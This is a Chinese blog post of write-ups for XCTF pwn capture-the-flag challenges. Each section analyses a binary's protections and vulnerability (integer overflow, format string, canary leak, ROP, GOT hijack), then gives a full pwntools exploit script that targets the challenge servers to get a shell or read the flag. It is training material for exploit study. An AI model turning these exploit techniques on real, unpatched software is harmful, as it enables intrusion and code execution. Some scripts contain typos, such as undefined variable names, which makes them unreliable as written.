---
layout: port
title: 攻防世界刷题记录
date: 2020-12-13 22:26:23
tags: 
     - PWN学习 
categories:
     - PWN学习 
     - 学习
cover: cover.png
index_img: cover.png
---

# 攻防世界-pwn-int_overflow-整数溢出

1.先检查程序，没有开启canary和pie

​         ![image-20210413101322876](image-20210413101322876.png)      

2.使用ida查看函数，main函数里会让你输入一个数字，当输入1时调用login()

 ![image-20210413101524638](image-20210413101524638.png)

查看login()函数

 ![image-20210413101553522](image-20210413101553522.png)

这里的第二个read函数读取的长度为0x199

然后再查看check_passwd函数

 ![image-20210413101615917](image-20210413101615917.png)

这里的v3是unsigned_int8型，存储8个字节，最多存储256个长度，这里可以进行整数溢出，下面的代码只要v3>3或者v3<8就可以通过验证，所以v3可以是259-264或者3-8个长度

 ![image-20210413101639471](image-20210413101639471.png)

3.继续观察函数，发现下面存在strcpy()函数存在栈溢出，但是&dest的栈有14个字节，所以我们得让v3整数溢出通过上面的判断，然后在偏移为14+ebp的时候写入后门函数的地址

 ![image-20210413101700572](image-20210413101700572.png)

 

后门函数地址为0x0804868B

 ![image-20210413101715484](image-20210413101715484.png)

所以编写payload

```python
from pwn import *
context.log_level = "debug"
cat_flag=0x0804868B  #后门函数地址

p = remote('220.249.52.134','39309')
p.sendlineafter("Your choice:","1")
p.sendlineafter("Please input your username:\n","2333")
payload='A'*0x14+'a'*4+p32(cat_flag)+'A'*(260-0x14-4-4)  
#'A'*0x14是到栈底的偏移量，'a'*4是ebp，最后填充的A需要补充长度到260才能导致整数溢出
p.sendlineafter("Please input your passwd:\n",payload)
p.interactive()

```

# 攻防世界-pwn-CGfsb-格式化字符串写入

1.首先检查程序

 ![image-20210413102120434](image-20210413102120434.png)                          

32位程序，开启了canary保护和nx

2.用ida打开查看函数，发现其中有一个printf(&s)存在明显的栈溢出

 ![image-20210413102138548](image-20210413102138548.png)

在第二次输入message时输入aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p可以知道偏移为10 

 ![image-20210413102154558](image-20210413102154558.png)

3.再次查看函数，里面有一段判断如果pwnme=8，则得到flag，所以我们可以用格式化字符串的漏洞覆盖pwnme的值

 ![image-20210413102219355](image-20210413102219355.png)

4.用ida查看pwnme的地址为0x0804A068，写出payload

 ![image-20210413102248705](image-20210413102248705.png)

```python
from pwn import *
context.log_level = "debug"

p = remote('220.249.52.134','39393')
pwnme_addr=0x0804A068         #pwnme的地址
p.sendlineafter("please tell me your name:\n","abab")
payload=p32(pwnme_adddr)+'a'*4+'%10$n'    
#利用格式化字符串在pwnme的地址写入8，因为pwnme的地址占4字节，再补充4*a到8，就可以使pwnme的值为8
p.sendlineafter("leave your message please:\n",payload)
p.interactive()

```



# 攻防世界-pwn-cgpwn2-32位rop链构造

1.先用checksec检查程序的保护

  ![image-20210413102641981](image-20210413102641981.png)                      

没有开启canary，然后使用ida查看代码，发现hello函数有一次存在栈溢出

 ![image-20210413102711827](image-20210413102711827.png)

并且发现name存在于bss中的地址是固定的0x0804A080

 ![image-20210413102724230](image-20210413102724230.png)

我们可以在name这个地方存储’/bin/sh’作为system的参数调用

Hello函数中存在一个get函数作为溢出点

 ![image-20210413102741169](image-20210413102741169.png)

离栈底为0x26

 ![image-20210413102759807](image-20210413102759807.png)

这时可以编写payload

```python
from pwn import *
context.log_level = "debug"
elf = ELF("./cgpwn2")
p = remote('220.249.52.134','50628')

sys_addr=elf.symbols['system']   #获取system的地址
name_addr=0x804a080

p.sendlineafter("please tell me your name\n","/bin/sh\x00")   #将/bin/sh写入name
payload='a'*0x26+'b'*4+p32(sys_addr)+'a'*4+p32(name_addr)     #32位的程序rop链构造，name中存放的数据作为system的参数
p.sendlineafter("hello,you can leave some message here:\n",payload)
p.interactive()

```

 

# 攻防世界 pwn-forgot-栈溢出

1. 先检查程序，发现只开启了nx保护

![image-20210413103114866](image-20210413103114866.png)

2. 观察函数发现scanf函数存在栈溢出。

![image-20210413103154789](image-20210413103154789.png)

再次观察其他函数发现存在一个后门函数可以直接拿到flag

![image-20210413103221109](image-20210413103221109.png)

先使用gdb进行调试，随便输入一些数据，发现最后返回的在ida里地址为0x80486CC的函数，在主函数中定义为v4

 ![image-20210413103238325](image-20210413103238325.png)

 ![image-20210413103251099](image-20210413103251099.png)

观察ida里其他函数，发现一个后门函数，地址为0x80486CC考虑使用栈溢出去执行它

 ![image-20210413103303074](image-20210413103303074.png)

在ida中查看栈空间可知，v4函数距离scantf输入的变量v2的偏移量为0x24

![image-20210413103429828](image-20210413103429828.png)

编写payload

```python
from pwn import *
p = remote("220.249.52.133", 33397)
backaddr=0x80486CC     #后门函数地址
p.recvuntil(">")
p.sendline("text")
p.recvuntil(">")
payload='a'*0x24+p32(backaddr)     #覆盖v4的地址为后门函数
p.sendline(payload)
p.interactive()	
```

 

 # 攻防世界 pwn-Mary_Morton-格式化字符串泄露canary

1. 先查看程序，发现没有开启地址随机化

![image-20210413103823331](image-20210413103823331.png)          

2. 进行调试，发现程序让你会让你选择漏洞

 ![image-20210413103844363](image-20210413103844363.png)

3. 用ida打开程序，发现在选择格式化字符串（2）的时候会调用一个printf函数，存在格式化字符串漏洞

主函数

 ![image-20210413103904120](image-20210413103904120.png)

函数sub_4008EB

 ![image-20210413103919834](image-20210413103919834.png)

由于程序开启了canary保护，所以得先通过格式化字符串泄露出canary的值，才能覆盖返回地址达到开启后门函数的目的。

查看栈空间，发现canary的值距离buf的位置是0x90-0x8=0x88，该程序是64位程序，一个格式化字符串占8字节，0x88/8=17，再通过格式化字符串判断偏移量

 ![image-20210413103935012](image-20210413103935012.png)

![image-20210413103953632](image-20210413103953632.png)

4.测试字符串的偏移，输入aaaa %p %p %p %p %p %p %p %p %p

 ![image-20210413104113264](image-20210413104113264.png)

根据回显可以知道偏移为6所以buf到var_8偏移为17+6=23

5.观察其他函数，发现有一个后门函数可以得到flag，地址为0x4008DA

​     ![image-20210413104124884](image-20210413104124884.png)

6.思路为先通过格式化字符串得到canary的值，然后再通过栈溢出去执行后门函数，得到flag，所以编写payload为

```python
from pwn import *
context.binary='Mary_Morton'
context.log_level = 'debug'
#io=process('./Mary_Morton')
io = remote("220.249.52.133", 45232)
#gdb.attach(io)
io.recvuntil("3. Exit the battle \n")
io.sendline('2')
catflag=0x4008DA        #后门函数的地址
payload = "%23$p"       #buf距离canary值的偏移为23
io.sendline(payload)
Canary=int(io.recvuntil("00"),16)   #得到canary的值
log.info("Canary:"+hex(Canary))
io.sendline('1')
payload = "a"*0x88+p64(Canary)+"a"*8+p64(catflag)
io.send(payload)
print io.recvall()
```

# 攻防世界 pwn-dice_game

1.先检查程序有没有存在栈溢出

​        ![image-20210413104229973](image-20210413104229973.png)                       

发现不存在canary保护，可能进行栈溢出的操作。

2.使用ida进行分析

主函数：

 ![image-20210413104245282](image-20210413104245282.png)

sub_A20()函数

 ![image-20210413104308863](image-20210413104308863.png)

经过分析可知，该程序的目的是对比输入的数字与随机生成的种子seed[]生成的随机数对6求余再加1进行对比，如果正确50次则通过。

 ![image-20210413104331604](image-20210413104331604.png)

通过查看地址可以知道当输入名字buf时，可以通过偏移覆盖到seed，偏移量为0x40

注：关于rand()和srand()随机函数:这两个函数生成的随机数实际上是一段数字的循环，这些数字取决于随机种子。在调用rand（）函数时，必须先利用srand()设好的随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。

所以只要控制随机数生成的种子seed，就可以预测生成的随机数，需要利用题目提供的库libc.so.6

Payload脚本

 ![image-20210413104657091](C:\Users\17473\Desktop\网安实验\makedown\image-20210413104657091.png)

# 攻防世界 pwn-stack2

1.先检查程序的保护

   ![image-20210413105116926](image-20210413105116926.png)      

发现程序没有开启地址随机化，但是开启了canary保护

2.用ida观察函数，发现其中存在数组越界导致的栈溢出。

 <img src="\12.png" alt="12" style="zoom:67%;" />

其中v5,v7都是我们可输入的数值，但是在赋值给数组时没有检查数组越界而导致了栈溢出

3.使用gdb进行动态调试，在存在该漏洞的函数下设置断点。

 <img src="image-20210413105310409.png" alt="image-20210413105310409" style="zoom:67%;" />

设置断点为0x8048839观察函数的偏移量。

 <img src="image-20210413105330148.png" alt="image-20210413105330148" style="zoom:67%;" />

函数的返回地址为0xf7e1d637

<img src="image-20210413105439298.png" alt="image-20210413105439298" style="zoom:67%;" /> 

查看当我们更改已经数组里的数字时的栈空间

 <img src="image-20210413105513866.png" alt="image-20210413105513866" style="zoom:67%;" />

经过检验和计算得到的偏移量为0x84

 ![11](11.png)

4.用ida查看发现存在后门函数hackhere，地址为0x0804859B

 <img src="image-20210413105759309.png" alt="image-20210413105759309" style="zoom:67%;" />

<img src="image-20210413105829019.png" alt="image-20210413105829019" style="zoom:67%;" />

5．先写出payload脚本将函数的返回地址覆盖为hackhere的函数地址

```python
#coding=utf-8
from pwn import *
g_local=0
context.log_level='debug'
hackhere = 0x0804859b
leave_offset = 0x84    #偏移量
p = remote("220.249.52.133", 58555)
def writebyte(offset,value):    #构造一个函数，方便修改栈里的地址
  p.sendline('3')
  p.recvuntil("which number to change:")
  p.sendline(str(offset))           
  p.recvuntil("new number:")
  p.sendline(str(value))      #利用数组越界修改栈中存放的函数返回值地址
##def writedword()
p.recvuntil("How many numbers you have:")
p.sendline('1')
p.recvuntil("Give me your numbers")
p.sendline('10')
writebyte(leave_offset,0x9b)         #题目是32位系统，小端序，高位地址存放在高位，依次写入hackhere的地址
writebyte(leave_offset+1,0x85)
writebyte(leave_offset+2,0x04)
writebyte(leave_offset+3,0x08)
p.sendline('5')
p.interactive()

```

运行之后发现hackhere函数提供的参数并不能拿到sh

 ![image-20210413110309852](image-20210413110309852.png)

此时只能构造ROP链将system函数的参数修改为/sh

首先查询system的plt表地址

 <img src="image-20210413110412418.png" alt="image-20210413110412418" style="zoom:67%;" />

可以看到system的plt表地址为0x08048450

然后查询参数sh的地址

<img src="image-20210413110506599.png" alt="image-20210413110506599" style="zoom: 80%;" />

参数sh的地址为0x08048987

修改payload

```python
#coding=utf-8
from pwn import *
g_local=0
context.log_level='debug'
hackhere = 0x0804859b
sh = 0x08048987
system =0x08048450
leave_offset = 0x84    #偏移量
p = remote("220.249.52.133", 59553)
def writebyte(offset,value):    #构造一个函数，方便修改栈里的地址
  p.sendline('3')
  p.recvuntil("which number to change:")
  p.sendline(str(offset))           
  p.recvuntil("new number:")
  p.sendline(str(value))      #利用数组越界修改栈中存放的函数返回值地址

p.recvuntil("How many numbers you have:")
p.sendline('1')
p.recvuntil("Give me your numbers")
p.sendline('10')
writebyte(leave_offset,0x50)         #题目是32位系统，小端序，高位地址存放在高位
writebyte(leave_offset+1,0x84)       #先写入system的plt表地址
writebyte(leave_offset+2,0x04)
writebyte(leave_offset+3,0x08)
leave_offset+=8                        #跳过ebp
writebyte(leave_offset,0x87)         #题目是32位系统，小端序，高位地址存放在高位
writebyte(leave_offset+1,0x89)       #写入参数sh
writebyte(leave_offset+2,0x04)
writebyte(leave_offset+3,0x08)
p.sendline('5')
p.interactive()
```



 # 攻防世界-pwn-string-格式化字符串

1.首先检查程序保护，发现保护除了PIE都开启了

<img src="image-20210413113058130.png" alt="image-20210413113058130" style="zoom:67%;" />                               

2.用ida打开并分析函数

 <img src="image-20210413113119231.png" alt="image-20210413113119231" style="zoom:67%;" />

主函数首先会打印出v4存储的值以及v4+4然后执行sub_400D72(v4)

下面是sub_400D72(v4)

 <img src="image-20210413113159566.png" alt="image-20210413113159566" style="zoom:67%;" />

先执行的是sub_400A7D()下图是sub_400A7D()，只能知道当显示So, where you will go?:时我们得输入east才能继续执行下去

 <img src="image-20210413113242197.png" alt="image-20210413113242197" style="zoom:67%;" />

再继续观察，发现sub_400CA6(a1)这个函数里有这样一段，如果a1数组的第一个数等于第二个数，那么可以执行外部命令（查找发现这个函数是可以执行shellcode的），传过来的a1数组就是开始的v3数组

 <img src="image-20210413113307543.png" alt="image-20210413113307543" style="zoom:67%;" />

然后在sub_400BB9()存在一处格式化字符串漏洞，由之前主函数可以知道v3的第一个数是68，v3[1]是85，要用格式化字符串漏洞让这两个数相等

 <img src="image-20210413113331447.png" alt="image-20210413113331447" style="zoom:67%;" />

在And, you wish is:输入1，Your wish is输入aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x查看输出，可以知道之前输入的1在第七个位置是格式化字符串的第七个参数

 <img src="image-20210413113404697.png" alt="image-20210413113404697" style="zoom:67%;" />

由于之前输出的secret[0]就是v3第一个数的地址，所以只要用格式化字符串漏洞修改其为85即可，然后输入shellcode（可以使用pwn库的函数自动生成）

所以可以构造payload

```python
from pwn import* 
context.log_level = "debug"

p = remote('220.249.52.134','48916')
p.recvuntil('secret[0] is ')
v3_addr=int(p.recv(7),16) #接收v3的地址

p.sendlineafter("What should your character's name be:\n","abab")
p.sendlineafter("So, where you will go?east or up?:\n","east")
p.sendlineafter("go into there(1), or leave(0)?:\n","1")
p.sendlineafter("\'Give me an address\'\n",str(v3_addr)) #第一次发送v3的地址
payload='a'*85+'%7$n'   #偏移为7，将v3的地址的位置的参数改为85
p.recvuntil('And, you wish is:/n')
p.sendline(payload)

p.recvuntil('I will help you! USE YOU SPELL\n')
p.sendline(asm(shellcraft.amd64.linux.sh(),arch="amd64"))  #发送调用/bin/sh的sellcode
p.interactive()	
```



# 攻防世界-pwn-pwn1-构造rop链泄露put的真实地址

1. 先检查文件属性

​    <img src="image-20210413113958358.png" alt="image-20210413113958358" style="zoom:67%;" />                  

该程序是64位程序，发现保护已经开的很全了

2.用ida观察主函数，发现有个read函数和puts函数可以进行栈溢出

 <img src="image-20210413114030279.png" alt="image-20210413114030279" style="zoom:67%;" />

3.观察栈结构，字符串s距离canary的值的偏移为0x90-0x8=0x88

   ![image-20210413114130145](image-20210413114130145.png)

所以可以通过put函数将canary显示出来，由于put函数遇到\00会停止输出，调试可以知道，当我们输入a*0x88后再输入回车时，回车的\0A会覆盖掉canary末尾的\00这时就可以输出canary

输入a*0x88不输入\n时的内存数据

 <img src="image-20210413114203956.png" alt="image-20210413114203956" style="zoom:67%;" />

Canary的值应该是0x7c5ddb9e9a8a7d00，但是继续运行程序选择“2“调用put函数时不输出canary的值。

输入’0x88’*a+’\n’的内存空间

 <img src="image-20210413114238047.png" alt="image-20210413114238047" style="zoom:67%;" />

这时可以正常输出canary的值了，但是末尾的\00会变成\0a，所以接受时要把末尾的\0a修改为\00

 ![image-20210413114309571](image-20210413114309571.png)

4.题目给了一个动态链接库，所以我们可以在里面寻找到execve("/bin/sh")的地址

 <img src="image-20210413114328650.png" alt="image-20210413114328650" style="zoom:67%;" />

随便选择一个0x45216，此题开启了地址随机化，如果想要通过栈溢出运行execve("/bin/sh")，就得泄露内存中的基址

5.利用put()函数泄露put()的真实地址，由于是64位程序，首先找到一个pop_rdi,查找可知地址为0x400a93

 <img src="image-20210413114404796.png" alt="image-20210413114404796" style="zoom:67%;" />

64位程序泄露put()真实地址的方式为：p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)，泄露之后就可以使用

由此可以编写payload

```python
from pwn import *
context.arch = "amd64"
context.log_level = "debug"
 
elf = ELF("./babystack")
p = remote('220.249.52.134','41209')
#p = process("./babystack")
libc = ELF("./libc-2.23.so")
execve = 0x45216
main_addr = 0x400908
puts_got = elf.got['puts']           #获取put的got表地址
puts_plt = elf.plt['puts']           #获取put的plt表地址
pop_rdi = 0x0400a93
 
payload = 'a'*0x88
p.sendlineafter(">> ","1")
p.sendline(payload)                  #先输入0x88个a使put()能够泄露出canary的值
 
p.sendlineafter(">> ","2")
p.recvuntil('a'*0x88+'\n')
 
canary = u64(p.recv(7).rjust(8,'\x00'))   #因为末尾的\n会覆盖末尾的\00
 
payload1 = 'a'*0x88+p64(canary)+'a'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
 
p.sendlineafter(">> ","1")
p.send(payload1)             #泄露出put()的真实地址
p.sendlineafter(">> ","3")
puts_addr=u64(p.recv(8).ljust(8,'\x00'))  #读取到\x00停止

execve_addr = puts_addr - (libc.symbols['puts'] - execve)   #使用相对偏移来计算execve的真实地址

payload2 = 'a'*0x88+p64(canary)+'a'*8 +  p64(execve_addr)  #覆盖返回值为execve的真实地址
p.sendlineafter(">> ","1")
p.sendline(payload2)
p.sendlineafter(">> ","3")
p.interactive()
```



# 攻防世界-pwn-welpwn-泄露write函数地址构建rop链接

1.先检查程序，只开启了nx

  <img src="image-20210413115205088.png" alt="image-20210413115205088" style="zoom:67%;" />                

2.用ida打开程序进行分析，主函数如下

<img src="image-20210413115228251.png" alt="image-20210413115228251" style="zoom:67%;" />

主函数会调用一个叫echo的函数，把输入buf传入，echo函数如下

 <img src="image-20210413115252303.png" alt="image-20210413115252303" style="zoom:67%;" />

此函数把传入的字符串依次复制给局部变量s2，直到0停止，注意到这里s2只有16个长度，可能会存在溢出，但是因为这里遇到\00会停止循环，不能直接构造rop链

通过调试，输入24个A的内存空间如下

<img src="image-20210413115320597.png" alt="image-20210413115320597" style="zoom:67%;" />

这两个栈是连续的，可以看成是这样的结构

0x10  s2  A * 16      0x38 buf  A * 8

0x18  s2  A*8       0x40 返回地址？

0x28    返回地址

0x30 buf  A*16

思路：首先我们输入的地址里不能存在\00，否则就不能读入到s2，因为栈是连续的，如果想要执行我们构造的rop链，就得跳过前面输入的0x18个长度的数据，可以寻找一个存在4个pop指令的地址，如下图0x40089c的位置就有4个连续的pop指令

 ![image-20210413214630486](image-20210413214630486.png)

这样我们可以构造这样的栈空间,就可以执行我们需要的函数了

0x10  s2  A\*16      0x38 buf  A*8

0x18  s2  A*8       0x40 pop_4

0x28    pop_4      0x48 pop_rdi

0x30 buf  A*16      0x50 got

此题我们开始没有给出libc的版本，所以我们先泄露write的地址，先找到一个pop_rdi的地址为0x4008a3

 <img src="image-20210413115639822.png" alt="image-20210413115639822" style="zoom:67%;" />

先写出一个泄露write地址的脚本，便于判断libc版本

```python
from pwn import* 
context.log_level = "debug"

p = remote('220.249.52.134','41584')
elf = ELF('./welpwn')  
write_got = elf.got['write']  
puts_plt = elf.plt['puts']
pop_4=0x40089c
pop_rdi=0x4008a3
main_addr = 0x4007CD

payload1='a'*0x18+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr)
p.sendlineafter("Welcome to RCTF\n",payload1)

p.recvuntil('\x40')  
#泄露write地址  
write_addr = u64(p.recv(6).ljust(8,'\x00'))
print('%#x'%write_addr)

```

得到write的地址为0x7f0e5b3c72b0，用后三位2b0查找libc的版本可以知道是2.23

![image-20210413214825951](image-20210413214825951.png)

最后构建payload

```python
from pwn import* 
context.log_level = "debug"

p = remote('220.249.52.134','41584')
elf = ELF('./welpwn')  
write_got = elf.got['write']  
puts_plt = elf.plt['puts']
pop_4=0x40089c
pop_rdi=0x4008a3
main_addr = 0x4007CD

payload1='a'*0x18+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr) 
#构建put函数的rop链，泄露write函数的地址
p.sendlineafter("Welcome to RCTF\n",payload1)

p.recvuntil('\x40')  
#获取write地址  
write_addr = u64(p.recv(6).ljust(8,'\x00'))
print('%#x'%write_addr)

libc=ELF("libc6_2.23.so")
libc_write=libc.symbols['write']   
libc_system=libc.symbols['system']
libc_binsh=next(libc.search("/bin/sh"))
#获取libc的基地址，用得到的write地址减去libc里write的地址
libc_base = write_addr - libc_write
#获取system地址  
system_addr = libc_base + libc_system  
#获取/bin/sh地址  
binsh_addr = libc_base + libc_binsh  

p.recvuntil('\n')  
payload2 = 'a'*0x18 + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
#构建rop链，执行system（/bin/sh）
p.sendline(payload2)
p.interactive()
```

# 攻防世界-pwn-pwn100-3个参数的万能rop链

1.首先检查程序，只开启了nx保护

​                     ![](image-20210413214930924.png) 

2.使用ida进行分析

主函数

 <img src="image-20210413214955997.png" alt="image-20210413214955997" style="zoom:67%;" />

Sub_40068E()

 <img src="image-20210413215015084.png" alt="image-20210413215015084" style="zoom:67%;" />

Sub_40063D()

 <img src="image-20210413215033863.png" style="zoom:67%;" />

可以看出这是一个for循环，每次都向v1的位置读取输入1个字节，i不能超过200

这里查看v1的栈空间只有0x40，可以进行栈溢出

 <img src="image-20210413215105959.png" alt="image-20210413215105959" style="zoom:67%;" />

再查看函数，存在puts和read，可以进行泄露，由于没有/bin/sh，所以我们得寻找一个数据段进行写入，用gdb查看内存段权限，发现0x00600e10到   0x00601068是可以进行读写的。

 <img src="image-20210413215131810.png" alt="image-20210413215131810" style="zoom:67%;" />

然后继续用ida查看此内存段，发现0x00600e10到0x601068处可以进行写入，用ida查看此处，发现在0x601040处有数据段可以使用此地址写入/bin/sh

 <img src="image-20210413215149078.png" alt="image-20210413215149078" style="zoom:67%;" />

我们可以使用程序中的read函数进行写入，read函数有3个参数，这时我们需要一个万能的Gadget进行传参，教程如https://xz.aliyun.com/t/5597，如下图，此程序中也存在__libc_csu_init()这样的函数

 <img src="image-20210413215216727.png" alt="image-20210413215216727" style="zoom:67%;" />

如图，先从 0x40075A 开始执行，将 rbx/rbp/r12/r13/r14/r15 这六个寄存器全部布置好，再 ret 到 0x400740 ，继续布置 rdx/rsi/rdi，最后通过 call qword ptr[r12+rbx*8] 执行目标函数。

这个通用 Gadget 好用的地方在于，不仅可以通过函数地址的指针（通常会用记录库函数真实地址的 got 表项）来控制目标函数，还可以控制目标函数的最多三个入参（rdi/rsi/rdx）的值。此外，只要设置 rbp=rbx+1而且栈空间足够，这个 Gadget 可以一直循环调用下去。栈的结构类似下图（原网页的图，第一个0x40061A对应该程序的0x40075A，0x400600对应该程序的0x400740.）

 <img src="image-20210413215235442.png" alt="image-20210413215235442" style="zoom:67%;" />

所以这里可以使用这个gadget构建read函数向.bss段写入/bin/sh

由于是64位程序，还要找到一个pop rdi的地址是0x400763

 <img src="image-20210413215305789.png" alt="image-20210413215305789" style="zoom:67%;" />

Payload脚本如下

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.log_level = 'debug'
#p = process('./pwn-100')
elf = ELF('./pwn-100')
p = remote('220.249.52.134','37423')
libc=ELF("libc-2.23.so")

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
read_plt = elf.plt['read']

pop_rdi = 0x400763
pop_6 = 0x040075A
mov_3 = 0x0400740
start = 0x0400550

#构造rop链，泄露puts函数真实地址
payload1 = 'a'*0x48 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)
payload1 = payload1.ljust(200, 'b')
p.send(payload1)
p.recvuntil('bye~\x0a')
puts_addr = u64(p.recvuntil('\x0a')[:-1].ljust(8, '\x00')) #把接收末尾的\0a替换为\00
print hex(puts_addr)

#用偏移量计算程序中的地址
libc_puts=libc.symbols['puts']
libc_system=libc.symbols['system']
libc_base = puts_addr - libc_puts
system_addr = libc_base + libc_system

#用read函数向0x601040写入
payload2 = 'a'*0x48 + p64(pop_6) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(0x601040) + p64(0)
#Gadget 需要布置六个寄存器（rbx/rbp/r12/r13/r14/r15）加一个 ret 返回地址，x64 下至少需要 56 个字节的栈空间
#所以mov_3之后的需要56个字节才能到返回到start
payload2 += p64(mov_3) + 'a'*56 + p64(start) 
payload2 = payload2.ljust(200, 'b')
p.send(payload2)
p.recvuntil('bye~\n')
#写入/bin/sh
p.send('/bin/sh\0')

#构造rop链进行getshell
payload3 = 'a'*0x48 + p64(pop_rdi) + p64(0x601040) + p64(system_addr) 
payload3 = payload3.ljust(200, 'b')
p.send(payload3)
p.interactive()
```

# 攻防世界-pwn-Recho-构造系统调用劫持got表

1.首先看一下程序的保护机制，只开启了NX保护

<img src="image-20210413220457874.png" alt="image-20210413220457874" style="zoom:67%;" />              

2.然后使用ida分析 ，主函数如下

 <img src="image-20210413220516158.png" alt="image-20210413220516158" style="zoom:67%;" />

可以看出，程序会先读取我们输入的数字，然后我们输入这个长度的字符串，然后程序会进行输出，然后我们注意到字符串里有一个flag，可能之后会用到

 <img src="image-20210413220534899.png" alt="image-20210413220534899" style="zoom:67%;" />

首先我们要考虑的是结束主函数的循环，pwntools里有一个shutdown的功能，可以用这个功能结束循环，但是就不能重新rop到主函数进行获取输入了，我们必须一次性完成所有操作。

由于要一次性完成操作，所以不能用之前的泄露地址的方法，这里因为数据段中存在flag，像open，write，read，alarm之类函数都存在系统调用（syscall）所以我们可以利用这个，可以直接抓取flag然后打印出来

故我们需要构造一个这样的代码

```c++
int fd = open("flag",READONLY); 
read(fd,buf,100); 
printf(buf); 
```

用gdb动态调试时对alarm进行分析

 <img src="image-20210413220620011.png" alt="image-20210413220620011" style="zoom:67%;" />

偏移为5的位置存在syscall,所以我们要进行劫持got表，首先我们得用

ROPgadget找到几个需要用到的构造代码

1.pop_rdi_ret=0x4008a3

 <img src="image-20210413220641797.png" alt="image-20210413220641797" style="zoom:67%;" />

2.pop_rax_ret=0x4006fc

 <img src="image-20210413220701351.png" alt="image-20210413220701351" style="zoom:67%;" />

3.add_rdi_ret = 0x40070d

 ![image-20210413220732971](C:\Users\17473\Desktop\网安实验\makedown\image-20210413220732971.png)

所以劫持alarm的got表的构造如下

```python
# alarm() ---> syscall
# alarm_got = alarm_got + 0x5
payload = 'a' * 0x38
# rdi = alarm_got
payload += p64(pop_rdi_ret) + p64(alarm_got)
# rax = 0x5
payload += p64(pop_rax_ret) + p64(0x5)
# [rdi] = [rdi] + 0x5 
payload += p64(add_rdi_ret)
```

第二步：构造fd = open(“flag”,READONLY)，由于open的系统调用号为2，所以把rax设置为2后调用syscall即可调用open()，ida中flag的地址为0x601058

 <img src="image-20210413220815449.png" alt="image-20210413220815449" style="zoom:67%;" />

还需要一个pop_rsi_ret = 0x4008a1

 ![image-20210413220835212](image-20210413220835212.png)

所以构造如下

```python
# fd = open("flag" , 0)
# rdi = &"flag"
payload += p64(pop_rdi_ret) + p64(flag)
# rsi = 0 (r15 = 0)
payload += p64(pop_rsi_ret) + p64(0) + p64(0)
# rax = 2
payload += p64(pop_rax_ret) + p64(2)
# open("flag" , 0)
payload += p64(alarm_plt)

```

第三步：构造read(fd,buf,100)，可以直接把flag文件打开，并且存放到一个可以读写的位置，因为.bss段是可以读写的，所以我们需要一个地址存储读出来的flag，这里我们选择buf=0x601068

 <img src="image-20210413220907110.png" alt="image-20210413220907110" style="zoom:67%;" />

还需要一个pop_rdx_ret = 0x4006fe

 <img src="image-20210413220925801.png" alt="image-20210413220925801" style="zoom:67%;" />

所以构造如下

```python
# read(fd, buf, 100)
# rdi = 3 打开一个文件
payload += p64(pop_rdi_ret) + p64(3)
# rsi = buf (r15 = 0)
payload += p64(pop_rsi_ret) + p64(buf) + p64(0)
# rdx = 100
payload += p64(pop_rdx_ret) + p64(100)
# read(3, buf, 100)
payload += p64(read_plt)
第四步：构造printf(buf)
#print flag
# rdi = buf
payload += p64(pop_rdi_ret) + p64(buf)
# printf(buf)
payload += p64(printf_plt)
根据以上描述，构造payload如下
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
elf=ELF('./Recho')
p=remote('220.249.52.134','41714')
pop_rdi_ret = 0x4008a3
pop_rax_ret = 0x4006fc
add_rdi_ret = 0x40070d
pop_rsi_ret = 0x4008a1
pop_rdx_ret = 0x4006fe
alarm_plt=elf.plt['alarm']
read_plt=elf.plt['read']
write_plt=elf.plt['write']
printf_plt=elf.plt['printf']
alarm_got=elf.got['alarm']
flag = 0x601058
buf = 0x601068

# 劫持alarm的got表
payload = 'a' * 0x38
# rax = 0x5
payload += p64(pop_rax_ret) + p64(0x5)
# rdi = alarm_got
payload+= p64(pop_rdi_ret) + p64(alarm_got)
# [rdi] = [rdi] + 0x5 
payload += p64(add_rdi_ret)

# 构造 fd = open("flag" , 0)
# rax = 2
payload += p64(pop_rax_ret) + p64(2)
# rdi = &"flag"
payload += p64(pop_rdi_ret) + p64(flag)
payload+=p64(pop_rdx_ret)+p64(0)
# rsi = 0 (r15 = 0)
payload += p64(pop_rsi_ret) + p64(0) + p64(0)
# open("flag" , 0)
payload += p64(alarm_plt)

# 构造 read(fd, buf, 100)
# rdi = 3 打开一个文件
payload += p64(pop_rdi_ret) + p64(3)
# rsi = buf (r15 = 0)
payload += p64(pop_rsi_ret) + p64(buf) + p64(0)
# rdx = 100
payload += p64(pop_rdx_ret) + p64(100)
# read(3, buf, 100)
payload += p64(read_plt)

#构造 printf(buf)
# rdi = buf
payload += p64(pop_rdi_ret) + p64(buf)
# printf(buf)
payload += p64(printf_plt)

p.recvuntil('Welcome to Recho server!\n')
p.sendline(str(0x200))
payload=payload.ljust(0x200,'\x00')
p.send(payload)
p.recv()
p.shutdown('send')
p.interactive()
p.close()

```

# 攻防世界-pwn-pwn-200-DynELF模块使用

1.先检查程序保护，32位程序，发现只开启了NX保护

​          <img src="image-20210413221127258.png" alt="image-20210413221127258" style="zoom:67%;" />                     

2.使用ida查看函数，主函数如下

 <img src="image-20210413221142918.png" alt="image-20210413221142918" style="zoom:67%;" />

发现在sub_8048484()函数下存在栈溢出漏洞

 <img src="image-20210413221159623.png" alt="image-20210413221159623" style="zoom:67%;" />

该题无libc，我们可以使用pwntool的DynELF模块

此题目借助DynElF模块实现有一下要点

本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下借助DynELF实现利用的要点：

 1）调用write函数来泄露地址信息，比较方便；

 2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；

 3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；

 4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。

### DynELF模块介绍

